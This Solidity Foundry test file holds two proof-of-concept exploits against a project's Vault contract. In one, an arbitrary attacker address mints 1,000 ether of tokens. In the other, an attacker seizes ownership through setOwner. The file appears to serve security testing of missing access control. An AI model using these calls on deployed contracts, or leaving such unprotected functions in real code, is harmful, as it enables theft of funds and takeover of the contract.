// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;
import "forge-std/Test.sol";
import {Vault} from "../src/Vault.sol";
contract VaultExploitTest is Test {
    Vault v;
    function setUp() public { v = new Vault(); }
    function test_anyoneCanMint() public {
        address attacker = address(0xA11CE);
        vm.prank(attacker);
        v.mint(attacker, 1_000 ether);
        assertEq(v.balanceOf(attacker), 1_000 ether);
    }
    function test_anyoneCanTakeOwnership() public {
        address attacker = address(0xBAD);
        vm.prank(attacker);
        v.setOwner(attacker);
        assertEq(v.owner(), attacker);
    }
}
